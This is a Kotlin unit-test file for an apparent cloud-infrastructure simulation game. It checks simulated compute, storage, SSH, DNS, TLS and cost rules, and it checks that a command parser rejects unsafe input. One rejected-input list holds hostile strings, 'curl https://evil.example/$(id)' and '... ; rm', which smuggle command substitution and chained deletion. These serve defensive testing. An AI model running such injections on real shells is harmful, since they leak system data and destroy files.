package commander

import kotlinx.serialization.json.*
import org.junit.Assert.*
import org.junit.Test
import java.io.File

private fun level(n: Int) = Fixtures.levels.first { it.order == n }
private fun WorldState.set(id: String, vararg kv: Pair<String,String>) = copy(resources=resources+(id to resources.getValue(id).let { it.copy(properties=it.properties+kv) }))
private fun Simulator.ok(w: WorldState, a: GameAction): WorldState { val r=dispatch(w,a); assertTrue(r.message,r.accepted); return r.world }
private fun Simulator.rejected(w: WorldState, a: GameAction) { val r=dispatch(w,a); assertFalse(r.message,r.accepted); assertEquals(w,r.world) }

class ComputeStorageTest {
    @Test fun powerStateMachineAndDerivedStatusCannotBeWritten() {
        val l=level(18); val sim=Simulator(l); var w=l.initialWorld
        sim.rejected(w,GameAction("power",id="app",value="STOP"))
        sim.rejected(w,GameAction("update",id="app",patch=mapOf("status" to "RUNNING")))
        w=sim.ok(w,GameAction("power",id="app",value="START")); assertEquals("RUNNING",w.resources["app"]?.p("status"))
        w=sim.ok(w,GameAction("power",id="app",value="STOP")); assertEquals("STOPPED",w.resources["app"]?.p("status"))
        assertEquals(0.0,Cost.of(w.resources.getValue("app")),0.0)
        sim.rejected(w,GameAction("power",id="data-vol",value="START"))
    }
    @Test fun diskUsesLongestAttachedMountElseRootVolume() {
        val w=Fixtures.solved(16); val app=w.resources.getValue("app")
        assertTrue(Disk.check(w,app).healthy)
        assertFalse(Disk.check(w.set("app","logPath" to "/var/log/app"),app.copy(properties=app.properties+("logPath" to "/var/log/app"))).healthy)
        val detached=w.copy(resources=w.resources+("logs-vol" to w.resources.getValue("logs-vol").copy(references=emptyMap())))
        assertFalse(Disk.check(detached,app).healthy)
        // A sibling path that merely shares a prefix is not on the mount.
        val sibling=app.copy(properties=app.properties+("logPath" to "/database/logs")); assertFalse(Disk.check(w,sibling).healthy)
        // sshd keeps answering while application ports degrade.
        assertFalse(Network.reachable(detached,"web","app",8080).allowed)
    }
    @Test fun attachedVolumeCannotBeDeletedAndMountPointsAreUnique() {
        val l=level(16); val w=Fixtures.solved(16); val sim=Simulator(l)
        sim.rejected(w,GameAction("delete",id="logs-vol"))
        sim.rejected(w,GameAction("create",resource=Resource("dup",Kind.VOLUME,properties=mapOf("sizeGb" to "50","mountPoint" to "/data","backupPolicy" to "none"),references=mapOf("attachedTo" to "app"))))
        sim.rejected(w,GameAction("create",resource=Resource("tiny",Kind.VOLUME,properties=mapOf("sizeGb" to "10","mountPoint" to "","backupPolicy" to "none"))))
        sim.rejected(w,GameAction("create",resource=Resource("sys",Kind.VOLUME,properties=mapOf("sizeGb" to "50","mountPoint" to "/boot","backupPolicy" to "none"),references=mapOf("attachedTo" to "app"))))
        val detached=sim.ok(w,GameAction("update",id="logs-vol",references=mapOf("attachedTo" to "")))
        assertFalse(Disk.check(detached,detached.resources.getValue("app")).healthy)
        assertFalse("logs-vol" in sim.ok(detached,GameAction("delete",id="logs-vol")).resources)
    }
    @Test fun backupsCopyDataAndAreImmutableAndRestoreSourceIsFixed() {
        val l=level(17); val sim=Simulator(l); val w=Fixtures.solved(17)
        val backup=w.resources.getValue("orders-bk"); assertEquals("sha256:7f3a91",backup.p("checksum")); assertEquals("200",backup.p("sizeGb"))
        sim.rejected(w,GameAction("update",id="orders-bk",patch=mapOf("type" to "INCREMENTAL")))
        sim.rejected(w,GameAction("update",id="restore-test",references=mapOf("sourceBackup" to "")))
        sim.rejected(w,GameAction("delete",id="orders-bk"))
        sim.rejected(l.initialWorld,GameAction("create",resource=Resource("bk",Kind.VOLUME_BACKUP,properties=mapOf("type" to "FULL","checksum" to "forged"),references=mapOf("volume" to "orders-vol"))))
        sim.rejected(w,GameAction("create",resource=Resource("small",Kind.VOLUME,properties=mapOf("sizeGb" to "100","mountPoint" to "","backupPolicy" to "none"),references=mapOf("sourceBackup" to "orders-bk"))))
    }
    @Test fun sshLayersReportDistinctBlockPoints() {
        val w=Fixtures.solved(14)
        assertTrue(Ssh.check(w,"operator","web","direct").allowed)
        assertEquals("web.authorized_keys",Ssh.check(w.set("web","sshKey" to "old-key"),"operator","web","direct").blockedAt)
        assertEquals("web.listener",Ssh.check(w.set("web","listenPorts" to "443"),"operator","web","direct").blockedAt)
        assertEquals("web.ingress",Ssh.check(w,"intruder","web","direct").blockedAt)
        assertEquals("publicIp",Ssh.check(w.set("web","publicIp" to ""),"operator","web","direct").blockedAt)
        assertFalse(Ssh.check(w,"nobody","web","direct").allowed)
    }
    @Test fun bastionChecksAllowListSessionTtlKeyAndTargetNsg() {
        val l=level(15); val w=Fixtures.solved(15)
        assertTrue(Ssh.check(w,"operator","app","bastion").allowed)
        assertEquals("bastion.allowlist",Ssh.check(w,"intruder","app","bastion").blockedAt)
        assertEquals("bastion-ssh.ttl",Ssh.check(w.copy(tick=10_000),"operator","app","bastion").blockedAt)
        assertEquals("bastion-ssh.key",Ssh.check(w.set("bastion-ssh","sshKey" to "other"),"operator","app","bastion").blockedAt)
        assertEquals("app.ingress",Ssh.check(w.set("app-nsg","rules" to ""),"operator","app","bastion").blockedAt)
        assertFalse(Network.reachable(w,"internet","app",22).allowed)
        assertFalse(Network.reachable(w,"internet","bastion",22).allowed)
        Simulator(l).rejected(w,GameAction("update",id="bastion-ssh",patch=mapOf("ttlTicks" to "180")))
        Simulator(l).rejected(l.initialWorld,GameAction("create",resource=Resource("s",Kind.BASTION_SESSION,properties=mapOf("port" to "22","sshKey" to "ssh-rsa AAAA","ttlTicks" to "60"),references=mapOf("bastion" to "app","target" to "app"))))
    }
}

class ObjectDatabaseTest {
    @Test fun bucketDefaultsPrivateAndAnonymousVersusAuthorizedAreSeparate() {
        val w=Fixtures.solved(19)
        assertTrue(Storage.restricted(w,"assets","workload").healthy)
        assertFalse(Storage.restricted(w.set("assets","visibility" to "public"),"assets","workload").healthy)
        assertFalse(Storage.restricted(w,"assets","other-workload").healthy)
        assertFalse(Storage.restricted(w,"missing","workload").healthy)
    }
    @Test fun lifecycleRunsOnlyWhenTimeAdvancesAndRespectsPrefix() {
        val l=level(21); val sim=Simulator(l)
        val configured=sim.ok(l.initialWorld,GameAction("update",id="logs-bkt",patch=mapOf("lifecycle" to "logs/|archive:30|delete:90")))
        assertTrue("old-log" in configured.resources)
        val later=sim.ok(configured,GameAction("advance_tick"))
        assertFalse("old-log" in later.resources); assertEquals("ARCHIVE",later.resources["mid-log"]?.p("tier")); assertTrue("report" in later.resources)
        listOf("logs/|archive:90|delete:30","|delete:5","logs/|purge:3","logs/|delete:0","logs/|archive:3|archive:4").forEach {
            sim.rejected(l.initialWorld,GameAction("update",id="logs-bkt",patch=mapOf("lifecycle" to it)))
        }
        assertTrue(Cost.total(l.initialWorld) > l.initialWorld.budgetCredits); assertTrue(Cost.within(later))
    }
    @Test fun databaseProvisionsOverTimeAndRejectsPlaintextSecrets() {
        val l=level(22); val sim=Simulator(l)
        val db=Resource("orders-db",Kind.DATABASE,properties=mapOf("privateIp" to "10.10.3.20","nsgs" to "db-nsg","port" to "1521","adminSecret" to "vault:orders-admin","autoBackup" to "true","retentionDays" to "30"),references=mapOf("subnet" to "db-sub"))
        sim.rejected(l.initialWorld,GameAction("create",resource=db.copy(properties=db.properties+("adminSecret" to "Passw0rd!"))))
        sim.rejected(l.initialWorld,GameAction("update",id="app",patch=mapOf("dbSecret" to "hunter2")))
        sim.rejected(l.initialWorld,GameAction("create",resource=db.copy(properties=db.properties+("status" to "AVAILABLE"))))
        var w=sim.ok(l.initialWorld,GameAction("create",resource=db)); assertEquals("PROVISIONING",w.resources["orders-db"]?.p("status"))
        sim.rejected(w,GameAction("create",resource=Resource("bk",Kind.DB_BACKUP,properties=mapOf("type" to "FULL"),references=mapOf("database" to "orders-db"))))
        w=sim.ok(w,GameAction("advance_tick",ticks=5)); assertEquals("AVAILABLE",w.resources["orders-db"]?.p("status"))
        assertEquals("empty",w.resources["orders-db"]?.p("checksum"))
        assertFalse(Network.reachable(w,"internet","orders-db",1521).allowed)
    }
    @Test fun restoreCopiesBackupPointAndRpoRequiresPreIncidentPoint() {
        val w=Fixtures.solved(23); val restored=w.resources.getValue("orders-restore")
        assertEquals("70",restored.p("pointInTime")); assertEquals("sha256:c5000",restored.p("checksum"))
        val rpo=Objective("rpo","db.rpoWithin",mapOf("app" to "app","source" to "orders-db","maxTicks" to "10"),"x")
        assertTrue(Predicates.evaluate(w,rpo).passed)
        assertFalse(Predicates.evaluate(w.set("orders-restore","pointInTime" to "78"),rpo).passed)
        assertFalse(Predicates.evaluate(w.set("orders-restore","pointInTime" to "40"),rpo).passed)
        assertFalse(Db.connected(w.set("app","dbSecret" to "vault:other"),"app").healthy)
        assertFalse(Db.connected(w.set("orders-restore","status" to "PROVISIONING"),"app").healthy)
    }
}

class PortalTest {
    @Test fun backendHealthLayersAndOverloadCollapse() {
        val w=Fixtures.solved(26); val lb=w.resources.getValue("lb")
        assertTrue(Lb.health(w,lb).all { it.healthy })
        assertTrue(Lb.health(w,lb.copy(properties=lb.properties+("healthPath" to "/healthz"))).none { it.healthy })
        assertFalse(Lb.health(w.set("web2","status" to "STOPPED"),lb).last().healthy)
        assertFalse(Lb.health(w.set("web-nsg","rules" to ""),lb).first().healthy)
        val surge=w.copy(requestRate=1500); val tight=lb.copy(properties=lb.properties+("healthTimeoutMs" to "100"))
        assertTrue(Lb.health(surge,tight).none { it.healthy }); assertEquals(0.0,Lb.slo(surge,tight).successPct,0.0)
        assertTrue(Lb.health(surge,lb).all { it.healthy }); assertTrue(Lb.slo(surge,lb).successPct < 99.9)
    }
    @Test fun dnsFollowsCnameAndRejectsBadRecords() {
        val l=level(27); val w=Fixtures.solved(27)
        assertEquals("203.0.113.50",Dns.resolve(w,"api.starport.example").ip)
        assertNull(Dns.resolve(w,"shop.starport.example").ip); assertNull(Dns.resolve(w,"www.other.example").ip)
        listOf("www|AAAA|::1|300","www|A|999.1.1.1|300","www|A|203.0.113.50|5","www|A|1.1.1.1|300;www|CNAME|x.example|300").forEach {
            Simulator(l).rejected(l.initialWorld,GameAction("create",resource=Resource("z",Kind.DNS_ZONE,properties=mapOf("domain" to "starport.example","records" to it))))
        }
        val loop=w.set("starport-zone","records" to "a|CNAME|b.starport.example|300;b|CNAME|a.starport.example|300")
        assertNull(Dns.resolve(loop,"a.starport.example").ip)
    }
    @Test fun tlsChecksExpiryHostnameAndWildcardDepth() {
        assertTrue(Tls.matches("*.starport.example","www.starport.example")); assertFalse(Tls.matches("*.starport.example","a.b.starport.example"))
        assertFalse(Tls.matches("*.starport.example","starport.example"))
        val w=Fixtures.solved(28); val lb=w.resources.getValue("lb")
        assertTrue(Tls.check(w,lb,"www.starport.example").healthy)
        assertFalse(Tls.check(w.copy(tick=10_000),lb,"www.starport.example").healthy)
        assertFalse(Tls.check(w,lb,"api.starport.example").healthy)
        val l=level(28); Simulator(l).rejected(l.initialWorld,GameAction("update",id="lb",patch=mapOf("listenPorts" to "80,443")))
        Simulator(l).rejected(w,GameAction("update",id="www-cert",patch=mapOf("validTicks" to "397")))
        assertTrue(Portal.check(w,"http://www.starport.example/").reason.startsWith("301"))
    }
    @Test fun staleDnsRecordIsDiagnosedAsDeadEndpoint() {
        val l=level(30); val r=Portal.check(l.initialWorld,"https://www.starport.example/",2)
        assertFalse(r.healthy); assertTrue(r.reason,r.reason.contains("203.0.113.60"))
    }
    @Test fun costIsDerivedFromShapesAndCannotBeEditedDirectly() {
        val w=Fixtures.solved(29); assertEquals(100.0,Cost.total(w),0.001); assertTrue(Cost.within(w))
        assertTrue(Simulator(level(29)).dispatch(w,GameAction("update",id="web4",patch=mapOf("shape" to "VM.Standard.E4.Flex.4"))).let { it.accepted && !Cost.within(it.world) })
        Simulator(level(29)).rejected(w,GameAction("update",id="web4",patch=mapOf("shape" to "BM.GPU.Huge")))
    }
}

class Phase2CommandTest {
    @Test fun newCommandsMapToActionsOrReadOnlyReports() {
        assertEquals("ssh",Commands.parse("ssh operator@web").action?.type)
        assertEquals(mapOf("client" to "operator","target" to "app","via" to "bastion"),Commands.parse("ssh --bastion bastion operator@app").action?.patch)
        assertEquals("dig",Commands.parse("nslookup www.starport.example").action?.type)
        assertEquals("http",Commands.parse("curl https://www.starport.example/").action?.type)
        assertEquals(Kind.OBJECT,Commands.parse("oci os object list").queryKind)
        val w=Fixtures.solved(26)
        assertTrue(Commands.parse("oci lb backend-health lb").report!!(w).contains("OK"))
        assertTrue(Commands.parse("df -h web1").report!!(w).contains("SIMULATED"))
        listOf("ssh root@web","ssh -i ~/.ssh/id_rsa operator@web","dig WWW.EXAMPLE","curl https://evil.example/$(id)","df -h /","oci lb backend-health lb; rm","ssh operator@web > out").forEach {
            assertNotNull(it,Commands.parse(it).error)
        }
    }
    @Test fun observationsDoNotEditStableResourceConfiguration() {
        val l=level(30); val w=l.initialWorld; val sim=Simulator(l)
        listOf(GameAction("ssh",patch=mapOf("client" to "operator","target" to "web1","via" to "direct")),GameAction("dig",value="www.starport.example"),GameAction("http",value="https://www.starport.example/")).forEach { a ->
            val next=sim.ok(w,a); assertEquals(w.resources,next.resources); assertEquals(w.changes,next.changes)
        }
    }
}

class SchemaRegistryTest {
    @Test fun schemaPredicateUnionMatchesRuntimeRegistryAndKinds() {
        val schema=Json.parseToJsonElement(File(Fixtures.root,"schemas/level.schema.json").readText()).jsonObject
        val union=schema.getValue("\$defs").jsonObject.getValue("objective").jsonObject.getValue("oneOf").jsonArray.associate { o ->
            val props=o.jsonObject.getValue("properties").jsonObject
            props.getValue("predicate").jsonObject.getValue("const").jsonPrimitive.content to props.getValue("params").jsonObject.getValue("properties").jsonObject.keys
        }
        assertEquals(Predicates.parameters,union)
        val kinds=schema.getValue("\$defs").jsonObject.getValue("resource").jsonObject.getValue("properties").jsonObject.getValue("kind").jsonObject.getValue("enum").jsonArray.map { it.jsonPrimitive.content }
        assertEquals(Kind.entries.map { it.name },kinds)
        val actions=schema.getValue("properties").jsonObject.getValue("allowedActions").jsonObject.getValue("items").jsonObject.getValue("enum").jsonArray.map { it.jsonPrimitive.content }.toSet()
        assertEquals(Catalog.actions,actions)
        assertTrue(Kind.entries.all { it in Validation.fields })
    }
}
